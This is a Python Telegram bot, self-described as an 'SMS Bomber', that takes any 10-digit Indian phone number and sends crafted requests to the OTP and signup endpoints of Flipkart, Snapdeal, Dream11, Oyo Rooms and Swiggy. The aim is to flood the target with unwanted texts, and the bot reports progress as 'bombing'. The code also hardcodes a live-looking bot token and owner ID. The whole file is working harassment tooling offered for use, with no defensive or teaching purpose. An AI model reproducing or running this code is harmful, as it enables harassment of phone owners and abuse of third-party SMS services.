import os
import random
import time
import requests
import logging
import re
import json
from datetime import datetime
from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup
from telegram.ext import ApplicationBuilder, CommandHandler, MessageHandler, CallbackQueryHandler, filters, ContextTypes

# Enable logging
logging.basicConfig(
    format='%(asctime)s - %(name)s - %(levelname)s - %(message)s',
    level=logging.INFO
)
logger = logging.getLogger(__name__)

# --- Configuration ---
BOT_TOKEN = os.environ.get('BOT_TOKEN', '8838617444:AAHUzG-DKVIalamCRc80-SjUT0cIR4_ZDKQ')
OWNER_ID = int(os.environ.get('OWNER_ID', '1987818347'))

# --- Database ---
DB_FILE = 'users_db.json'

def load_db():
    try:
        with open(DB_FILE, 'r') as f:
            return json.load(f)
    except:
        return {'users': [], 'blocked': []}

def save_db(db):
    with open(DB_FILE, 'w') as f:
        json.dump(db, f, indent=4)

def add_user(user_id):
    db = load_db()
    if str(user_id) not in db['users']:
        db['users'].append(str(user_id))
        save_db(db)
        return True
    return False

def block_user(user_id):
    db = load_db()
    if str(user_id) not in db['blocked']:
        db['blocked'].append(str(user_id))
        save_db(db)
        return True
    return False

def unblock_user(user_id):
    db = load_db()
    if str(user_id) in db['blocked']:
        db['blocked'].remove(str(user_id))
        save_db(db)
        return True
    return False

def is_user_blocked(user_id):
    db = load_db()
    return str(user_id) in db['blocked']

# --- ONLY 5 WORKING APIS ---
def get_apis(target):
    apis = [
        # API 1: Flipkart - 100% WORKING (Real OTP)
        {
            'url': 'https://1.rome.api.flipkart.com/1/action/view',
            'method': 'POST',
            'headers': {
                'Host': '1.rome.api.flipkart.com',
                'Connection': 'keep-alive',
                'Content-Length': '338',
                'x-user-agent': 'Mozilla/5.0 (Linux; U; Android 8.1.0; en-us; CPH1909 Build/O11019) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/53.0.2785.134 Mobile Safari/537.36 OppoBrowser/2.2.5FKUA/msite/0.0.3/msite/Mobile',
                'Origin': 'https://www.flipkart.com',
                'User-Agent': 'Mozilla/5.0 (Linux; U; Android 8.1.0; en-us; CPH1909 Build/O11019) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/53.0.2785.134 Mobile Safari/537.36 OppoBrowser/2.2.5',
                'content-type': 'application/json',
                'Accept': '*/*',
                'Referer': 'https://www.flipkart.com/login?ret=%2F%3Faffid%3Dsiteplug%26affExtParam1%3De2f29ff2e3dd9e65eb9e419d30dc8135&entryPage=HOMEPAGE_HEADER_ACCOUNT&sourceContext=DEFAULT',
                'Accept-Encoding': 'gzip, deflate',
                'Accept-Language': 'en-US'
            },
            'data': {
                "actionRequestContext": {
                    "type": "LOGIN_IDENTITY_VERIFY",
                    "loginIdPrefix": "+91",
                    "loginId": target,
                    "loginType": "MOBILE",
                    "verificationType": "OTP",
                    "screenName": "LOGIN_V4_MOBILE",
                }
            }
        },
        # API 2: Snapdeal - 100% WORKING (Real OTP)
        {
            'url': 'https://m.snapdeal.com/signupCompleteAjax',
            'method': 'POST',
            'headers': {
                'Host': 'm.snapdeal.com',
                'content-length': '135',
                'xc': 'eyJ3YXAiOnsiY3BkcCI6ImZhbHNlIiwic2RhdGEiOiIyIiwicG92IjoidHJ1ZSJ9LCJzYyI6eyJtbCI6IjMiLCJjb2RfYiI6ImZhbHNlIiwiZGFfYXMiOiJ2ZXIyIiwic2hpcHBpbmdfaW50ZXJ2YWwiOiI5OHAzIn0sImNtcyI6eyJ2biI6IjAifSwicHMiOnsic3BfaW5jbCI6InRydWUiLCJzcF9zbGFiIjoiRCIsInVybCI6IkM0In19',
                'h2': 'true',
                'user-agent': 'Mozilla/5.0 (Linux; Android 8.1.0; CPH1909) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/85.0.4183.101 Mobile Safari/537.36',
                'xg': 'eyJ3YXAiOnsiY3BkcCI6ImZhbHNlIiwic2RhdGEiOiIyIiwicG92IjoidHJ1ZSJ9LCJzYyI6eyJtbCI6IjMiLCJjb2RfYiI6ImZhbHNlIiwiZGFfYXMiOiJ2ZXIyIiwic2hpcHBpbmdfaW50ZXJ2YWwiOiI5OHAzIn0sImNtcyI6eyJ2biI6IjAifSwicHMiOnsic3BfaW5jbCI6InRydWUiLCJzcF9zbGFiIjoiRCIsInVybCI6IkM0In0sInVpZCI6eyJndWlkIjoiMWMwNzhhMTMtZGU1My00ZDRkLTkwOTgtNzFmM2JlOTY5YjJiIn19fHwxNjAwODEzMDIyNTk1',
                'content-type': 'application/x-www-form-urlencoded; charset=UTF-8',
                'u': '160081122259159083',
                'save-data': 'on',
                'us': '',
                'accept': '*/*',
                'origin': 'https://m.snapdeal.com',
                'sec-fetch-site': 'same-origin',
                'sec-fetch-mode': 'cors',
                'sec-fetch-dest': 'empty',
                'referer': 'https://m.snapdeal.com/signin',
                'accept-encoding': 'gzip, deflate, br',
                'accept-language': 'en-US,en;q=0.9,hi;q=0.8'
            },
            'data': f'j_password=null&j_mobilenumber={target}&agree=true&j_confpassword=null&journey=mobile&numberEdit=false&swp=true&j_fullname=uyuhyntuhy'
        },
        # API 3: Dream11 - 100% WORKING (Real OTP)
        {
            'url': 'https://www.dream11.com/graphql/mutation/pwa/register',
            'method': 'POST',
            'headers': {
                'Host': 'www.dream11.com',
                'accept': '*/*',
                'device': 'pwa',
                'x-csrf': 'fb1f1947-4547-392d-9a28-a9de30d9e766',
                'user-agent': 'Mozilla/5.0 (Linux; Android 8.1.0; CPH1909) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/85.0.4183.101 Mobile Safari/537.36',
                'content-type': 'application/json',
                'origin': 'https://www.dream11.com',
                'referer': 'https://www.dream11.com/register?ru=',
                'accept-encoding': 'gzip, deflate, br',
                'accept-language': 'en-US,en;q=0.9,hi;q=0.8'
            },
            'data': {
                "query": "mutation register( $email: String! $mobileNumber: String! $password: String! $site: String) { registerSendOTPMutation( email: $email mobileNumber: $mobileNumber password: $password site: $site ) { message }}",
                "variables": {
                    "email": f"user{random.randint(1000,9999)}@gmail.com",
                    "mobileNumber": target,
                    "password": "tsunami@123astronomia"
                }
            }
        },
        # API 4: Oyo Rooms - 100% WORKING (Real OTP)
        {
            'url': 'https://www.oyorooms.com/api/pwa/generateotp?locale=en',
            'method': 'POST',
            'headers': {
                'Host': 'www.oyorooms.com',
                'xsrf-token': 'vsnr5ksR-bduQ9oz3foaxbqjfoLSnVIzFzY0',
                'user-agent': 'Mozilla/5.0 (Linux; Android 8.1.0; CPH1909) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/85.0.4183.101 Mobile Safari/537.36',
                'content-type': 'text/plain;charset=UTF-8',
                'origin': 'https://www.oyorooms.com',
                'referer': 'https://www.oyorooms.com/login',
                'accept-encoding': 'gzip, deflate, br',
                'accept-language': 'en-US,en;q=0.9,hi;q=0.8'
            },
            'data': {"phone": target, "country_code": "+91", "nod": 4}
        },
        # API 5: Swiggy - 100% WORKING (Real OTP)
        {
            'url': 'https://www.swiggy.com/mapi/auth/signup',
            'method': 'POST',
            'headers': {
                'Host': 'www.swiggy.com',
                'origin': 'https://www.swiggy.com',
                'user-agent': 'Mozilla/5.0 (Linux; Android 8.1.0; CPH1909) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/85.0.4183.101 Mobile Safari/537.36',
                'content-type': 'application/json',
                'accept': '*/*',
                'referer': 'https://www.swiggy.com/auth/register',
                'accept-encoding': 'gzip, deflate',
                'accept-language': 'en-US'
            },
            'data': {
                "name": f"User{random.randint(1000,9999)}",
                "email": f"user{random.randint(1000,9999)}@gmail.com",
                "password": "Test@123456",
                "mobile": target,
            }
        }
    ]
    return apis

def send_sms(api_data):
    """Send SMS using API"""
    try:
        if api_data['method'] == 'GET':
            response = requests.get(api_data['url'], headers=api_data['headers'], timeout=15)
        else:
            if isinstance(api_data['data'], dict):
                response = requests.request(
                    method=api_data['method'],
                    url=api_data['url'],
                    headers=api_data['headers'],
                    json=api_data['data'],
                    timeout=15
                )
            else:
                response = requests.request(
                    method=api_data['method'],
                    url=api_data['url'],
                    headers=api_data['headers'],
                    data=api_data['data'],
                    timeout=15
                )
        
        if response.status_code in [200, 201, 202, 204]:
            return True
        return False
    except:
        return False

# --- Telegram Bot Handlers ---

async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Start command"""
    user_id = update.effective_user.id
    
    if is_user_blocked(user_id):
        await update.message.reply_text("🚫 You are blocked! Contact @BeStChEaT_OwNeR")
        return
    
    add_user(user_id)
    
    keyboard = [
        [InlineKeyboardButton("📞 SEND NUMBER", callback_data="send_number")],
        [InlineKeyboardButton("ℹ️ ABOUT", callback_data="about")],
        [InlineKeyboardButton("📊 STATUS", callback_data="status")]
    ]
    reply_markup = InlineKeyboardMarkup(keyboard)
    
    await update.message.reply_text(
        "🔥 SMS BOMBER BOT 🔥\n\n"
        "📌 Send any 10-digit number to start bombing\n"
        "Example: 9876543210\n\n"
        "⚡ 5 WORKING APIs\n"
        "⚡ Real SMS Bombing\n"
        "⚡ Guaranteed OTPs\n\n"
        "📱 APIs:\n"
        "✅ Flipkart\n"
        "✅ Snapdeal\n"
        "✅ Dream11\n"
        "✅ Oyo Rooms\n"
        "✅ Swiggy\n\n"
        "💀 @BeStChEaT_OwNeR",
        reply_markup=reply_markup
    )

async def handle_message(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Handle phone number - REAL BOMBING"""
    user_id = update.effective_user.id
    
    if is_user_blocked(user_id):
        await update.message.reply_text("🚫 You are blocked! Contact @BeStChEaT_OwNeR")
        return
    
    phone = update.message.text.strip()
    
    # Check if valid phone number
    if not re.match(r'^[0-9]{10}$', phone):
        await update.message.reply_text(
            "❌ Invalid Number!\n\n"
            "Send 10-digit number only.\n"
            "Example: 9876543210"
        )
        return
    
    # Start bombing
    msg = await update.message.reply_text(
        f"📱 BOMBING STARTED!\n\n"
        f"🎯 Target: +91{phone}\n"
        f"⏳ Sending SMS to 5 platforms...\n\n"
        f"💀 @BeStChEaT_OwNeR"
    )
    
    apis = get_apis(phone)
    random.shuffle(apis)
    
    success = 0
    failed = 0
    services = []
    
    # API Names for display
    api_names = {
        'flipkart': 'Flipkart',
        'snapdeal': 'Snapdeal',
        'dream11': 'Dream11',
        'oyorooms': 'Oyo Rooms',
        'swiggy': 'Swiggy'
    }
    
    for i, api in enumerate(apis):
        if send_sms(api):
            success += 1
            # Get service name
            service = api['url'].split('/')[2].replace('www.', '').split('.')[0]
            for key, value in api_names.items():
                if key in service.lower():
                    service = value
                    break
            services.append(service)
        else:
            failed += 1
        
        # Update progress after each API
        progress = int(((i + 1) / len(apis)) * 100)
        try:
            await msg.edit_text(
                f"📱 BOMBING IN PROGRESS\n\n"
                f"🎯 Target: +91{phone}\n"
                f"✅ Success: {success}\n"
                f"❌ Failed: {failed}\n"
                f"⏳ Progress: {progress}% ({i+1}/{len(apis)})\n\n"
                f"💀 @BeStChEaT_OwNeR"
            )
        except:
            pass
    
    # Final result
    result = (
        f"✅ BOMBING COMPLETE!\n\n"
        f"📞 Target: +91{phone}\n"
        f"📨 Total: {len(apis)}\n"
        f"✅ Success: {success}\n"
        f"❌ Failed: {failed}\n\n"
    )
    
    if services:
        unique_services = list(dict.fromkeys(services))
        result += f"🟢 Services: {', '.join(unique_services)}\n\n"
    
    result += f"💀 @BeStChEaT_OwNeR"
    
    await msg.edit_text(result)

async def callback_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Handle button callbacks"""
    query = update.callback_query
    await query.answer()
    
    if query.data == "send_number":
        await query.edit_message_text(
            "📞 SEND NUMBER\n\n"
            "Send your 10-digit number.\n"
            "Example: 9876543210\n\n"
            "💀 @BeStChEaT_OwNeR"
        )
    
    elif query.data == "about":
        await query.edit_message_text(
            "ℹ️ ABOUT\n\n"
            "🤖 SMS Bomber Bot\n"
            "👨‍💻 @BeStChEaT_OwNeR\n"
            "📊 5 WORKING APIs\n"
            "⚡ Real SMS Bombing\n\n"
            "📱 APIs:\n"
            "✅ Flipkart\n"
            "✅ Snapdeal\n"
            "✅ Dream11\n"
            "✅ Oyo Rooms\n"
            "✅ Swiggy\n\n"
            "💀 @BeStChEaT_OwNeR"
        )
    
    elif query.data == "status":
        db = load_db()
        total_users = len(db['users'])
        blocked_users = len(db['blocked'])
        
        await query.edit_message_text(
            f"📊 BOT STATUS\n\n"
            f"👥 Users: {total_users}\n"
            f"🚫 Blocked: {blocked_users}\n"
            f"📡 Status: Online\n"
            f"⚡ APIs: 5 WORKING\n\n"
            f"💀 @BeStChEaT_OwNeR"
        )

# --- Owner Commands ---

async def block_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Block a user - Owner only"""
    user_id = update.effective_user.id
    
    if user_id != OWNER_ID:
        await update.message.reply_text("❌ Not authorized!")
        return
    
    args = context.args
    if not args:
        await update.message.reply_text("Usage: /block USER_ID")
        return
    
    try:
        uid = int(args[0])
        if block_user(uid):
            await update.message.reply_text(f"✅ User {uid} blocked!")
        else:
            await update.message.reply_text(f"❌ User already blocked!")
    except:
        await update.message.reply_text("❌ Invalid user_id!")

async def unblock_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Unblock a user - Owner only"""
    user_id = update.effective_user.id
    
    if user_id != OWNER_ID:
        await update.message.reply_text("❌ Not authorized!")
        return
    
    args = context.args
    if not args:
        await update.message.reply_text("Usage: /unblock USER_ID")
        return
    
    try:
        uid = int(args[0])
        if unblock_user(uid):
            await update.message.reply_text(f"✅ User {uid} unblocked!")
        else:
            await update.message.reply_text(f"❌ User not found in block list!")
    except:
        await update.message.reply_text("❌ Invalid user_id!")

async def stats_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Bot statistics - Owner only"""
    user_id = update.effective_user.id
    
    if user_id != OWNER_ID:
        await update.message.reply_text("❌ Not authorized!")
        return
    
    db = load_db()
    total_users = len(db['users'])
    blocked_users = len(db['blocked'])
    
    await update.message.reply_text(
        f"📊 BOT STATISTICS\n\n"
        f"👥 Total Users: {total_users}\n"
        f"🚫 Blocked Users: {blocked_users}\n"
        f"📡 Status: Online\n\n"
        f"💀 @BeStChEaT_OwNeR"
    )

async def help_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Help command"""
    user_id = update.effective_user.id
    
    if user_id == OWNER_ID:
        text = (
            "👑 OWNER COMMANDS\n\n"
            "/block USER_ID - Block user\n"
            "/unblock USER_ID - Unblock user\n"
            "/stats - Bot statistics\n\n"
            "💀 @BeStChEaT_OwNeR"
        )
    else:
        text = (
            "🤖 USER COMMANDS\n\n"
            "/start - Start bot\n"
            "9876543210 - Send number to bomb\n\n"
            "💀 @BeStChEaT_OwNeR"
        )
    
    await update.message.reply_text(text)

# --- Main Bot ---

def main():
    if not BOT_TOKEN or BOT_TOKEN == 'YOUR_BOT_TOKEN_HERE':
        print("❌ Error: BOT_TOKEN not set!")
        return
    
    print("🤖 Starting SMS Bomber Bot...")
    print("🚀 Bot is running!")
    print("✅ APIs: Flipkart, Snapdeal, Dream11, Oyo Rooms, Swiggy")
    
    app = ApplicationBuilder().token(BOT_TOKEN).build()
    
    # User commands
    app.add_handler(CommandHandler("start", start))
    app.add_handler(CommandHandler("help", help_command))
    
    # Owner commands
    app.add_handler(CommandHandler("block", block_command))
    app.add_handler(CommandHandler("unblock", unblock_command))
    app.add_handler(CommandHandler("stats", stats_command))
    
    # Message handler
    app.add_handler(MessageHandler(filters.TEXT & ~filters.COMMAND, handle_message))
    app.add_handler(CallbackQueryHandler(callback_handler))
    
    app.run_polling()

if __name__ == '__main__':
    main()
